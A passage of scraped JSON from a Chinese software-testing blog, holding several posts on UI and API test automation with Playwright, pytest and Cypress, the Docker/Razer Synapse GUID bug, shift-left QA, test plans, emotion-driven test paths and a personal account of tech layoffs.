作者给的例子都是弹框的，确实很少见到有人专门写东西来讨论弹窗的处理，简而言之一些弹框跟业务无关，那么就直接点掉或者不让它弹。比如之前我在写wordpress用例的时候，打开编辑器后总会出现全屏的用户引导教程，页面上所有文本框都没办法进行输入，我这时候认为新手教程不影响业务的核心流程，所以用了一些js代码直接让引导教程没办法弹出来。另一方面，如果出现的弹框是与业务强相关，那么弹与不弹就是两个用例，分别进行测试就好。\n另外除了弹框，还有一些处理也可以分类来探讨。比如测试环境下超时时间调长一点，加载不出来就刷新一下，这种问题再测试环境是可以容忍的，不影响主业务和流程。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E8%81%8A%E8%81%8Aui%E8%87%AA%E5%8A%A8%E5%8C%96%E7%94%A8%E4%BE%8B%E7%9A%84%E5%B0%BA%E5%BA%A6/","title":"聊聊ui自动化用例的尺度"},{"content":"\n关于测试左移shift left的讨论已经持续了很长一段时间了，前几天刚好看到有外国友人亲身参与了这个过程，结果有点出人意料，所以翻译出来分享了一下。\n在2017年，成为一名QA是一个有趣的时间。但不是搞笑哈哈，是有点点诡异了。每个人都想着测试左移（在合理范围内），但不是为了提高他们的质量，他们会以减少传统的质量保障人员的瓶颈的心态来做，那就是在迭代结束时，测试所有的东西。\n我记得几年前，我是一个由5个开发人员组成的团队中唯一的QA，我们没有大量的自动化测试，但左移的思维方式得到了应用，至少是部分应用。我在开发人员做需求时，尽早地帮助他们，这在迭代结束后会得到回报，测试阶段的时间是最少的。充其量，我们会在测试阶段发现一两个问题，并迅速修复它们（或假设该问题到下一个版本）。\n公司内部的一个新项目已经开始了，他们想在一开始就应用左移的思维方式，但他们不需要QA。所有的工作都可以通过自动化测试完成，开发人员将完全承担和拥有这些测试。作为一个QA人员，我很好奇，我想看看他们是怎么做的，他们是怎么涵盖这个用例的，或者其他用例的，我想学习并帮助他们。但是我被推到了一边，因为自动化才是王道，不需要 \u0026ldquo;手动QA\u0026rdquo;。\n当他们在几个月后找到我的时候，我遇到了 \u0026ldquo;告诉你 \u0026ldquo;的时刻，他们在生产中出现了大量的问题。那是一个混乱的局面。这时他们意识到，即使他们写了大量的测试，他们也没有考虑到他们的测试策略。解决方案是在团队中加入一个 \u0026ldquo;手动QA\u0026rdquo;，来处理应用程序的问题，防止生产中出现更多的错误。\n快到今天，我意识到他们已经非常接近了。他们拥有自动化测试策略。团队中的任何新开发人员都经历了严格的代码覆盖率、配对编程和细致的提交代码审核过程。他们唯一缺少的是一个好的测试策略，按照测试金字塔的描述进行工作（我知道你们中的一些人鄙视这个，但有时，它真的可以帮助团队分类并专注于正确的事情！），以及在用户体验上多想一点。\n那么，你的QA团队成员可以在左移的转型或项目中扮演什么角色呢？ 在开始 \u0026ldquo;左移 \u0026ldquo;时，文档被证明是有用的。通过确保针对现有功能和新功能中最关键的点，它可以更容易地从传统的方法过渡。通常把重点放在用户的关键功能和你的应用程序中常见的脆弱点上。 参加研发的启动会议。帮助提前考虑潜在的问题，用例子来引导这些会议是最好的做法。就我个人而言，我更喜欢在开发人员开始一个需求时以非正式的方式召开这些会议，但你也可以把这些会议变成一个定期会议，类似于你的scrum计划和复盘会议。这种做法也被称为3 amigos（读起来不错）。 学会阅读代码，看看PR评论，学习自动化，你的QA团队成员越是多才多艺，开发人员就越有信心作为一个团队来交付他们的功能，而不是依赖一个QA警察。 如果你的团队没有一个已经在职的QA，你的团队已经可以开始应用同样的准则。停下来，呼吸，花15分钟思考可能的测试用例。不要在功能上走得太深，但思考所有可能的用户行为有很大的帮助。把它们写下来👏。这将帮助你防止很多 \u0026ldquo;我没有想到的 \u0026ldquo;情况。\n虽然这不是一个完美的指南，但这是很好的第一步，我称之为 \u0026ldquo;在3天周末前的星期五下午4点部署的信心\u0026rdquo;。但这是另一个故事了。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B2%A1%E6%9C%89qa%E5%B0%B1%E6%B2%A1%E6%9C%89bug/","title":"没有QA就没有Bug"},{"content":"今天看到一个很有意思的bug，背后的故事令人印象深刻。\n你知道吗，docker的windows版本不能跟Razer Synapse的驱动管理程序同时运行，至于原因嘛，我们慢慢道来。\n这两个程序都希望用户只运行1个程序的实例，这个大家很好理解，同1个程序只打开1次，第2次打开的时候并不打开1个新的窗口，而还是使用之前的打开的程序的实例。\n那这个是如何实现的呢？答案是使用它们的.NET assembly 提供的GUID作为全局锁来实现，就像是去上洗手间，每次进去以后把门锁上，这样就可以保证洗手间里一次只有一个人使用了。\n那么.NET assembly是什么呢？我对.NET一无所知，翻了下文档，这是官方的解释\nAn assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET application.They provide the common language runtime with the information it needs to be aware of type implementations.\n看起来assembly提供了获取程序运行时信息的接口，每个应用程序都有自己独占的assembly。\n那么这两个程序是怎么实现获取自身运行时的GUID的呢？下面是代码\n1 2 string.Format(\u0026#34;Global\\{0}\u0026#34;, (object) Assembly.GetExecutingAssembly().GetType().GUID); 上面代码的本意是获取正在运行的assembly生成的GUID，这样由于应用程序就可以通过这个唯一的ID去实现全局锁了。这就好比是拿到了应用程序的身份证号码，用这个号码去加锁，相同身份证号的应用程序就不能同时运行了。\n想法是好的，然而是上面的实现是大错特错的。\n.GetType()方法应该在车底，不应该在车里，这个方法并没有返回assembly本身，它返回的是System.Reflection.RuntimeAssembly，这是.NET的一部分。所以当程序运行的时候，这两个应用程序都会使用GUID加全局锁，但是因为他们并没有使用自己运行时产生的GUID，他们使用的是.NET自身GUID，所以他们用的GUID是一模一样的。这样这对难兄难弟的身份证号是一样的，这样一个人进入了卫生间，用身份证号加了锁，另一个人想进去，哪怕卫生间里有空的隔间，但是由于全局锁用身份证号锁住了，所以管理员是不会让有相同身份证号的人进去的。这两个应用只能运行一个，不能同时运行。\n有意思吧，那么为什么这2个应用会同时犯这个低级的错误呢？出错都出的这么心有灵犀？你能猜到吗？\n我相信应该有人能猜出来，这是因为stackoverflow的关系。stackoverflow是个程序员问答网站，是程序员版的知乎，不会写的代码去这里问问，很快就会有人给出实现代码。\n时间回到2009年有个叫做Nathan的用户问了一个问题：如何获取运行中的assembly的GUID。\n12分钟以后，名为Cerebrus的用户回答了这一问题，很不幸，他的回答是错误的。\n1年零1个月之后，名为Yoopergeek的用户指出了这一点，Cerebrus给出的获取GUID的方式不正确。此时时钟走到了2010年。\n3年后，Cerebrus发现了自己的错误，他回到了这个问题，并修改了自己的答案，不过他并不能删除自己的回答，因为这个答案被标记为了接受，按潜规则，这样的答案是不能被移除的，这是2013年。\n5年后的2018年，有用户反馈docker windows版不能与Razer Synapse的驱动管理程序同时运行。\n因为这个错误实在过于巧合，所以有人猜测是由于stackoverflow上的错误答案导致了这个可能是史上最有意思bug的产生，也许这两个项目的开发者在09-10年之间不约而同的找到了这个回答，然后没有经过详细验证就把代码拷贝到自己的小本本里。然后命运的车辙终于相交，在后面的一些年月里，这些代码被翻了出来，不约而同的在一些项目中被使用到，从而引发了最终的问题，这段错误的代码终于完成了自己的使命，让这个莫名其妙的bug变得精彩绝伦。\n那么终极问题来了：对于测试同学来说，我们如何去有效的发现类似的bug呢？欢迎留言讨论。\n最后贴上关于这个问题描述的具体来源，有兴趣的同学可以去考据一下。\nhttps://stackoverflow.com/questions/502303/how-do-i-programmatically-get-the-guid-of-an-application-in-net-2-0/502323#502323\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%AF%8F%E4%B8%AA%E7%A6%BB%E8%B0%B1%E7%9A%84bug%E8%83%8C%E5%90%8E%E6%80%BB%E6%9C%89%E4%B8%80%E4%B8%AA%E7%B2%BE%E5%BD%A9%E7%BB%9D%E4%BC%A6%E7%9A%84%E5%B9%95%E5%90%8E%E6%95%85%E4%BA%8B/","title":"每个离谱的bug背后总有一个精彩绝伦的幕后故事"},{"content":"最近接了一个新项目，配套有个web管理后台页面，尽管需求一直在迭代以及测试时间相对不宽裕，我还是决定写点自动化用例作为功能测试的补充和回归测试的输入，顺便玩一下playwright，不在真是项目中使用一种技术其实是很难对这种技术产生深刻理解的。\n项目介绍 管理后台是前后端分离的，前端用的react加上蚂蚁的前端组件库，后端是基于golang构建的微服务。其实这种项目更适合做接口测试，ui自动化作为补充就好了。\n技术选型 这点很清楚，之前benchmark过，playwright比cypress性能要好，所以直接选playwright，另外playwright的python版本完全安装之后自带了pytest和一系列断言，基本上开箱即用，非常方便。另外为什么不用js而用python，主要是因为我用python写了一点接口用例，有些数据库操作的代码可以稍微复用一下，所以统一起见用python+playwright\n第一个难点：登录 管理后台接的是google auth，由于我的账号开启了二次验证，需要收验证码，所以从ui上输入用户名和密码登录就走不通了。不过登录的原理基本相同，就是往cookie里写一些东西，后面所有的请求都自动带cookie到后端，后端通过之前写的那些东西就可以判断用户是谁，什么时候登录失效等。知道了原理后面就是随便试试了，我的代码大概是这样写的\n1 2 3 def login(page): page.goto(\u0026#34;url\u0026#34;) page.evaluate(f\u0026#39;()=\u0026gt; document.cookie=\u0026#34;{COOKIE}\u0026#34;\u0026#39;) 其实就是先访问被测页面，然后自动跳到登录页面，这时候去用js设置cookie，之后再访问一次被测页面就可以自动登录了。\ncookie的话可以从浏览器的开发者工具里直接拷贝出来，因为是测试环境，所以cookie的有效期很长，基本可以放心使用。\n至于如何定期刷新cookie其实也不难搞，写个浏览器插件，每次打开被测页面的时候就把cookie发到一个自建后台服务，这个服务就是把cookie存到redis里，在测试用例里直接访问redis拿最新的cookie就好了。\n定位有点麻烦 作为熟练工，定位对我来说应该不会是大问题，然而现在的前端组件层级嵌套厉害，html的表意性不强，而且id，name等比较有标志性的属性也不是很多，踌躇良久之后我决定请前端同学在一些关键的组件上面加上id或者name，尽管他们不是很愿意，但是我倚老卖老，还是让他们从了。\nplaywright的元素定位策略非常灵活，从这几天的使用情况来看，建议还是css加xpath，如果你css不熟那就直接用xpath，优点是从浏览器上就可以直接复制xpath，缺点是复制的xpath稳定性很差，页面结构稍微发生一些变化就不可用了。\n最后就是playwright有录制的功能，我一般是在调试暂停的时候顺便打开录制，看看playwright自己录制的定位器是怎么样的，感觉大多数时候playwright的录制结果很靠谱，不比自己写要差。playwright生成的代码里text属性用的相对比较多点，对于多语言的系统来说需要慎用。\n日期选择器 大人，大清早就亡了。\n很多年前我们在处理日期选择器的时候基本上是用js来set相应的input的value值，可以做到不管ui怎么样，我想设置成什么值都可以的效果。\n然而，这次时代变了。ant框架的日期选择器直接设置value值并没有什么用。我尝试过打开日期选择器选择今天的日期，因为今天的日期会高亮，所以选起来比较容易，但这样就做不到选择任意一天的效果，对于写用例来说相当不友好。\n最后经过一番尝试，还是使用黑科技，模拟键盘在日期框上输入相应的日期，模拟键盘按下回车键，代码如下。\n1 2 3 4 5 6 def select_time_range(self, start, end): start_str = start.strftime(\u0026#39;%Y-%m-%d 00:00:00\u0026#39;)\tend_str = end.strftime(\u0026#39;%Y-%m-%d 23:59:59\u0026#39;)\tself.page.locator(\u0026#39;#validTime\u0026#39;).type(start_str) self.page.locator(\u0026#39;.ant-picker-input input \u0026gt;\u0026gt; nth=1\u0026#39;).type(end_str) self.page.locator(\u0026#39;#validTime\u0026#39;).press(\u0026#39;Enter\u0026#39;) 数据清理 我的用例基本建立在数据的基础上，比如我会先创建一系列的数据，然后通过确定的条件去搜索数据，再度创建数据，编辑数据等，等于是写了剧本的，每个用例按照安排运行，这就要求在所有用例执行之后做数据清理的工作，这就要求我去数据库里更新每条记录的软删除字段。另外搜索页面的数据放在es里，这就要求清理的过程中除了数据库之外还要顺便把es清掉，稍微有一点点麻烦，不过还好，几行代码的事情。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import pymysql.cursors import requests, logging, sys logging.basicConfig(format=\u0026#39;%(asctime)s:%(levelname)s:%(message)s\u0026#39;, level=logging.DEBUG) mysql_conf = { \u0026#39;host\u0026#39;: \u0026#39;xxxxx\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;test\u0026#39;, \u0026#39;port\u0026#39;: 3306, \u0026#39;db\u0026#39;: \u0026#39;xxx_db\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;secert\u0026#39;, } class DBCleaner: def __init__(self) -\u0026gt; None: self.c = pymysql.connect(host=mysql_conf[\u0026#39;host\u0026#39;], user=mysql_conf[\u0026#39;user\u0026#39;], port=mysql_conf[\u0026#39;port\u0026#39;], password=mysql_conf[\u0026#39;password\u0026#39;], database=mysql_conf[\u0026#39;db\u0026#39;], cursorclass=pymysql.cursors.DictCursor) def delete_by_mid(self, mid): with self.c.cursor() as cursor: select_sql = f\u0026#34;Select id from biz_tab where m_id = %s;\u0026#34; cursor.execute(select_sql, (mid)) for row in cursor: self.delete_es_index_by_biz_id(row[\u0026#39;id\u0026#39;]) logging.info(f\u0026#34;Delete by mid = {mid}\u0026#34;) sql = f\u0026#34;Delete from biz_tab where m_id = %s;\u0026#34; cursor.execute(sql, (mid)) self.c.commit() def delete_es_index_by_biz_id(self, biz_id): url = f\u0026#34;test_index/_doc/{biz_id}\u0026#34; response = requests.request(\u0026#34;DELETE\u0026#34;, url).json() logging.info(f\u0026#34;Deleting es index for {biz_id}, result is {response[\u0026#39;result\u0026#39;]}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) == 1: print(\u0026#34;USAGE: db_cleaner m_id\u0026#34;) else: m_id = sys.argv[-1] cleaner = DBCleaner() cleaner.delete_by_mid(m_id) 上面的脚本有2个作用\n当module引入时可以调用删除的方法，传入mid就可以删除对应的记录 直接命令行执行时给出mid也能删除 确保清除成功 pytest在断言失败之后，后面的代码是不会被执行的，为了确保每次都会调用清理的代码，我们需要使用pytest的fixture机制，代码如下\n1 2 3 4 5 @pytest.fixture def data_set(): m_id = \u0026#39;12\u0026#39; yield {\u0026#39;m_id\u0026#39;: m_id} DBCleaner().delete_by_mid(m_id) 总结 经过几天的把玩和用例编写，发现\n迭代工程中的项目确实不太适合写ui自动化测试，不过千金难买我喜欢，我就要写 playwright很好用 page object还是得用 pytest很好用 headless很好用 直接写js很好用 简单来说，熟练工是第一生产力。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%BC%BA%E8%A1%8C%E4%B8%BA%E6%96%B0%E9%A1%B9%E7%9B%AE%E5%86%99ui%E8%87%AA%E5%8A%A8%E5%8C%96%E7%94%A8%E4%BE%8B%E6%98%AF%E4%B8%80%E7%A7%8D%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/","title":"强行为新项目写ui自动化用例是一种什么样的体验"},{"content":"继续上次的话题，为新项目写ui自动化测试是一件非常有挑战的事情，写接口测试会不会容易一点呢？这次我就尝试了一下。\n现阶段我们的管理端接口其实不多，就8个左右，所以从工作量上评估其实还可以。\n测试策略 讲策略之前我们先看一下项目的简单业务属性。该项目的管理后台其实就是稍微复杂一点的增删改查。增加一条记录，编辑记录，各种组合条件查询记录，删除功能暂时没有，后面可能会跟进。\n我的测试策略也很简单，首先搭建1个单独的测试环境，防止跟其他测试形式冲突，然后把最大的精力放在数据的准备和清理上。\n准备数据：为了测试查询，比较好的方式是每次都先清空数据库，然后动态创建一些固定的数据，我指的固定是比如固定100条，每条的排序规则，各个字段都是确定的。 数据清理：完成测试后清空数据库，比如搜索测试完成之后清空数据库去测试创建和编辑，这样创建的时候就没有存量数据造成的断言干扰，就可以实现每次创建之前数据都是0条，创建成功之后变成1，这样断言就相对容易，而且用例能够以随机的顺序运行，减少了依赖； 代码实现 这里最有挑战的是数据准备和清理的代码实现，我需要准备下面的数据\n通过接口创建一些数据到db，之所以用接口创建是因为一些联动的操作直接写db的话无法触发。我们的接口是http的，用python+requests就可以了，稍微麻烦的点是构造的数据需要通过接口的有效性校验，比如时间区间之类的，因为我们的服务会跑在多个不同的国家和地区，timezone也是需要关注的 把创建成功的数据id以及一些需要用到的字段存到redis里。我习惯于用redis的set，因为天生去重，并且可以使用srandmember来随机返回几条数据，在做查询校验的时候非常方便 查询一些关联表的信息或者需要用到的数据，保存在redis里。这里我用的是redis的string类型，需要保存的信息直接序列化成json字符串，非常的方便； 直接写sql做数据库的清理，直接调用es的resetful api做索引的清理。我们的查询使用的是es，所以清理数据的时候除了用sql去delete之外，es的index也是要清理的 使用配置文件来进行多环境多地区的配置，比如mysql每个地区的配置都不一样，同样的地区不同的业务数据也在不同的库里，把配置弄起来还是很有必要的 最终实现的效果是运行TEST_ENV=test REGION=cn python data_builder.py这条命令之后就可以在对应的环境创建初始化数据了。代码比较啰嗦我就不粘贴了。\n用例编写 用例编写无非是增删改查。\n新增记录\n测试各种边界条件，比如一些字段本来是必填的，就是任性不填。本来要求string类型结果传number类型等待 测试正常的情况，起码要把正常流程跑通 下面是一个例子\n1 2 3 4 5 6 def test_ads_target_keyword_list_should_be_mandatory(valid_data_set): del valid_data_set[\u0026#39;target_keyword_list\u0026#39;] res = common_helpers.post_with_cookie(\u0026#34;/create\u0026#34;, valid_data_set) common_assertion(res) assert res[\u0026#39;code\u0026#39;] != SUCCESS assert \u0026#39;required\u0026#39; in res[\u0026#39;msg\u0026#39;] 这里可以分享2点有意思的地方\n返回值的错误码尽管可以枚举，但是逐一判断还是比较麻烦的，这里我就直接断言返回码不等于SUCCESS，SUCCESS其实可以看成是一个宏，所有用例里都统一 错误信息可以不需要精确判断，判断几个关键字是否存在就好了，比如上面例子里的required 编辑记录\n从之前生成的记录里随机挑1条进行更新，因为我把所有初始化的记录id都存在了redis的set里，这一步其实就非常的自然了 测试各种边界情况，除了字段的合法性之外还要测试一些编辑特有的用例，比如只能编辑自己的记录 测试正常编辑成功的情况 搜索及查询\n因为数据是提前生成好的，所以我们可以构造各种条件来进行断言，比如我就构造了10条active状态的记录，10条inactive的记录，按照状态来搜索时我可以直接断言，active就是10条，多一点少一点就是bug 构造多维度的搜索条件，这样覆盖面就更广一点，比如按A字段搜索，按B字段搜索，按A和B组合在一起搜索等 比如这个用例\n1 2 3 4 5 6 7 8 9 10 def test_search_with_no_conditions(): page_size = 20 data = { \u0026#39;filter\u0026#39;: {}, \u0026#39;page_num\u0026#39;: 1, \u0026#39;page_size\u0026#39;: page_size, } res = common_helpers.post_with_cookie(f\u0026#34;/action/search/list\u0026#34;, data) assert res[\u0026#39;code\u0026#39;] == SUCCESS assert len(res[\u0026#39;data\u0026#39;][\u0026#39;data\u0026#39;]) == page_size 这里我没有传入任何条件，只判断了当前返回的数据条数必须等于page size，因为我之前创建了足够多的数据，所以这个用例是非常安全和稳定的\n总结 最好有单独的测试环境 用配置文件来保存各个环境的配置，有配置中心更好，这样就不用改代码 在运行用例时通过环境变量来指定环境和地域，如果你的服务需要跑在多个国家和地区的话 每次都创建自己的测试数据集，这样断言起来会更加的容易 创建数据的脚本也可以用来进行ui自动化测试 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%BC%BA%E8%A1%8C%E4%B8%BA%E6%96%B0%E9%A1%B9%E7%9B%AE%E5%86%99%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E6%98%AF%E4%B8%80%E7%A7%8D%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/","title":"强行为新项目写接口测试是一种什么样的体验"},{"content":"今年的年度关键词里大概率会出现裁员这个选项。国内互联网公司风风火火的进行了一整年，最近硅谷也在跟进，根据已经放出风来的口径统计的话，硅谷头部公司大概会裁员120k左右，超过了当年互联网泡沫时期的107k，有分析人士指出，这只是开始而已，这个冬天，裁员的寒风会更加凛冽。\n裁员的逻辑 逻辑其实很简单，全球经济不好，互联网增长不及预期，而且找不到新的增长点，这样之前为增长而储备的人力就需要释放，裁员明显是一个很好的选项，所以华尔街出现了一些公司越裁员股价越涨的情况。另外一般以增长为目标的项目或产品，往往投入高收益少，也就是所谓不赚钱的业务，后面裁员的目标将非常聚焦和具体，只要不赚钱，那么走人的可能性就非常大。\n被裁之后 首先被裁不是员工自身的问题，所谓的时势造英雄，整个大环境不好让所有人都很难独善其身。被裁之后的心理压力一定是巨大的，管理好情绪开始下一段旅程，这个世界还是充满着无限的可能，不要因为别人的错误而自怨自艾，记住，在这个大的时代背景和叙事框架下，你的被裁大概率是在为别人的失误买单。\n风暴中心 这次我其实处在裁员的风暴中心，分享几个事情。\n我们部门这次裁员了75%，之前坐满了一层楼，而且裁员两天后就已经冷冷清清，士气凋零。\n跟同事聊天，他说有些毕业生被裁后拿到的赔偿金额够他们生活1到2年，完全有时间去考公上岸，也算是提前离场，开启下一段人生。\n其他部门很多同事人心惶惶，下一个是不是自己无法确定，下一波什么时候到来也让人惴惴不安。\n跟国外的同事聊天，他们目前有11个人，下个月就只有10个人，因为其中1人收到了np，notice period，有兴趣的同学可以查查是什么意思。他们国家今年经济其实发展的不错，但是互联网行业整体不行，其他大厂也在裁员，相当惨烈。安慰了他几句，很默契的互相留了联系方式，因为大家都不知道哪天会突然离开。\n配合另一地区的同事进行上线之前的验收，那位同学早上还在提bug，下午的时候就忽然告诉我他要走了，刚刚被裁，last day就是今天下班。我无话可说，安慰了几句，互相留了联系方式。感觉像是在玩狼人杀，每天都有人被刀的样子，期待明天会是一个平安夜。他走的时候问我：你觉得今年会不会有年终奖？我的回答是: I doubt。\n有的人被裁后很快就找到了工作，也有的人两个月了没什么进展，找工作这个事情因人而异，但总体看来市场上的需求明显不如几年前那么旺盛。\n有人觉得压抑，想主动离开，我总是劝留不劝走，从行业内来看，外面的世界无奈大过于精彩。\n经常有滚动裁员，量不大，比如前两天又离开了10%左右，工作的安全感非常欠缺。\n总结 其实无话可说，安全第一，共克时艰。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%BA%B2%E5%8E%86%E8%A3%81%E5%91%98%E7%AB%9E%E8%B5%9B/","title":"亲历裁员竞赛"},{"content":"看到一篇非常有意思的女性测试从业者的技术分享，忍不住翻译了一下，角度非常感性，引人深思，测试的世界其实特别多元，也希望以后有机会能遇到各种有意思的观点。\n原文地址: https://fishouthebox.medium.com/the-power-of-emotion-driven-testing-280a944d352b\n昨晚，我在Ministry of Testing的TestBash World做了一个演讲，其中有一部分是关于情感的。其中有一部分我分享了10条情感路径，你可以用来指导你的测试。来源于Gojko Adzi, David Evans和Tom Roden的《改善我们测试的五十个快速想法》一书。\n我把这个写在博客上是出于Gwen Diagram的一个建议，以文字的形式来分享这个内容会很有用。因此，我们开始吧。\n可怕的路径\u0026ndash;对你的利益相关者来说，什么会真正烧毁你的房子？可能是品牌效应？安全风险？ 快乐的路径\u0026ndash;每次都能通过的道路。 愤怒的路径 - 试图让应用程序做出糟糕的反应。如验证错误、不良输入和逻辑区域。 疏忽的路径 - 考虑需要测试的安全风险，如认证、授权、权限、数据保密性。 尴尬的路径\u0026ndash;会造成巨大尴尬的事情，如主页上的拼写错误。 荒凉的路径\u0026ndash;为应用程序或组件提供暗淡的东西。例如nulls、blanks或缺失的数据。 遗忘之路\u0026ndash;填满内存和CPU容量，使应用程序没有地方可以存储任何东西。看看它变得多么健忘，是否开始丢失数据，要么是已经存储的东西，要么是它正在持有的东西。 犹豫不决的路径\u0026ndash;打开和关闭一些东西，点击浏览器上的返回按钮等。 贪婪的路径\u0026ndash;选择一切，勾选每一个方框，选择每一个选项。 紧张的路径\u0026ndash;找到功能和组件的突破点。负载/性能测试的考虑。 by乙醇：情绪相关的分类方式更加感性一些，相比于我们理性的测试用例和测试场景来说，这里没有对错之分，只要考虑的全面，用任何分类方式都是合理的。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%83%85%E6%84%9F%E9%A9%B1%E5%8A%A8%E6%B5%8B%E8%AF%95/","title":"情感驱动测试"},{"content":"测试计划在国内其实不是很流行。之前在外企工作的时候，每一次的测试工作基本上都是以编写测试计划开始的。好的测试计划可以让团队成员对测试整体进行和测试策略以及方法有一个大体的认识，在一定程度上可以节约沟通成本。最近正好在github上看到一份测试计划文档，我们就一起来学习一下其中的精华吧。项目地址：https://github.com/fityanos/awesome-quality-assurance-roadmap#test-plan-sample\n1 介绍 1.1 项目介绍 介绍项目上下文\n1.2 读者 描述一下读者人群，比如来自A团队的alice以及来自B团队的bob\n2 测试策略 2.1 测试目标 比如完整的回归测试，还是增量的功能验证等；\n2.2 测试假定 假设某些东西不需要考虑或者满足某些条件，比如测试环境上可能没有配置负载均衡，这时就可以假定大家都理解这个点，并可以进行适当的忽略\n2.3 测试原则 比如所有bug必须fix之类的原则性的东西\n2.4 测试范围和级别 这里可以定义测试的范围，该做的就做，不该做的就先约定清楚。比如可以定义\n功能测试范围和时间以及交付物 性能测试范围和时间以及交付物 回归测试范围和时间以及交付物 UAT测试的范围和时间以及交付物 2.5 LOE(level of effort) 这里就是工作量的分解了，越清晰越好。\n3 执行策略 3.1 开始和退出条件 比如功能测试的开始条件是产品体验通过和开发自测通过，结束的条件是所有的bug都被fix\n3.2 测试轮次 第一轮 第二轮 \u0026hellip;\u0026hellip; 对于敏捷测试团队来说，其实可以忽略测试轮次的概念。对于瀑布流开发团队来说则需要定义清楚，因为每一轮的时间都很宝贵。\n3.3 测试指标 这里实际上定义的是测试报告的类型的频率，比如测试执行进度的汇报频率是每天，而测试覆盖率的汇报频率可以低一些，比如每个迭代汇总一次。\n3.4 缺陷的追踪及报告 这里定义bug的生命周期。\n4 测试管理流程 4.1 测试设计流程 4.2 用例执行流程 4.3 测试风险以及依赖方 这里需要提前考虑清楚测试风险以及依赖方，最重要的是需要找到back up，先把退路想好。\n4.4 团队成员及角色 5 测试环境 这里可以描述测试环境的详细信息，比如测试环境的配置以及数据库情况，staging环境的相关情况，因为staging可能用的是线上正式库。\n6 排期和交付 项目过程中每个测试阶段的排期和交付物在这里定义，也是整篇文档最重要的部分。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95%E8%AE%A1%E5%88%92/","title":"如何编写测试计划"},{"content":"今天我看到了一个有趣的UI集成测试加速方法，该方法与我想的底层优化、分布式运行或多线程运行方式不同。该作者重新编排了测试用例的执行顺序，删除了一些代码，并从执行流程上进行了优化。这确实很有趣。在本文中，我将简单介绍他的原文，希望对大家有所帮助。\n我们将展示如何加速一个客户的构建过程，这样他们可以在相同的预算下多运行40%的构建。\n我必须承认，我是单元测试的超级粉丝。我早期的一些博客文章就是关于单元测试的。\n单元测试是快速的、可预测的、而且隔离的。它们被很好地隔离在一个沙盒中，这就是它们的可预测性和快速性。\n我们推出了一个版本，用户无法进入登录页面，但这是另一个故事了。我把它命名为“一个没有集成测试和几十个单元测试的项目”。\n并不是说我完全停止写单元测试，而是我很少使用它们。大部分是用于可以安全地进行隔离测试的功能，例如一个接受各种输入并返回各种输出的函数。用集成测试来测试可能的值矩阵是不值得的。\n想象一下，有一个日历组件，用户可以输入一个日期，从一个下拉日历中选择数据，然后点击一个按钮来获得一个建议的日期。所有的日期都可以是不同的格式，这取决于用户如何输入它们。是否值得为每种可能的日期格式进行集成测试？也许不值得！\n然而，我们把输入的日期发送到一个负责解释许多不同格式的输入日期的实用函数，但它总是返回一个Date对象。为这个实用函数写一个单元测试将是一个很好的主意！对于整个应用来说，就不是那么回事了。\n假设你正在建立一个问题跟踪器。你有一个集成测试，打开一个对话框，试图保存一个里程碑而不指定名称。这将导致一个错误。你的另一个测试试图创建一个里程碑，但现在指定了一个名称。这不会导致错误，并显示消息“新的里程碑已保存”。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 beforeEach(async () =\u0026gt; { await createNewProject(); }); it(\u0026#39;cannot create milestone without a name\u0026#39;, () =\u0026gt; { clickNewMilestoneButton(); newMilestoneDialog.clickSave(); newMilestoneDialog.should(\u0026#39;have.text\u0026#39;, \u0026#39;Milestone name is required\u0026#39;); }); it(\u0026#39;creates a milestone\u0026#39;, () =\u0026gt; { clickNewMilestoneButton(); newMilestonDialog.getNameField().type(\u0026#39;February Milestone\u0026#39;); newMilestoneDialog.clickSave(); newMilestoneDialog.should(\u0026#39;have.text\u0026#39;, \u0026#39;New milestone saved\u0026#39;); }); 乍一看，上面的测试没有问题。然而，从零开始创建一个新项目涉及设置名称，填写一些起始/结束日期，键入描述，从下拉列表中选择项目所有者，为项目提供相同的标签，填写其他几个字段。我们的测试运行器（我现在使用Cypress）必须单击所有这些字段，键入一些内容，等待一些建议出现，然后单击，再等待。\n或者，将运行时间放在注释里，像这样想象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 beforeEach(async () =\u0026gt; { // 运行10秒 await createNewProject(); }); it(\u0026#39;cannot create milestone without a name\u0026#39;, () =\u0026gt; { // 运行2秒 clickNewMilestoneButton(); newMilestoneDialog.clickSave(); newMilestoneDialog.should(\u0026#39;have.text\u0026#39;, \u0026#39;Milestone name is required\u0026#39;); }); it(\u0026#39;creates a milestone\u0026#39;, () =\u0026gt; { // 运行3秒 clickNewMilestoneButton(); newMilestonDialog.getNameField().type(\u0026#39;February Milestone\u0026#39;); newMilestoneDialog.clickSave(); newMilestoneDialog.should(\u0026#39;have.text\u0026#39;, \u0026#39;New milestone saved\u0026#39;); }); 整个测试套件运行25秒（2x10 + 2 +3），但我们感兴趣的事情只占了其中的5秒（2 + 3）。\n那么我们能做得更好吗？因为这两个操作都发生在同一个newMilestonDialog中，我们可以认为在填写名称之前，应该首先尝试不带名称的保存。\n我们的测试将如下所示：\n1 2 3 4 5 6 7 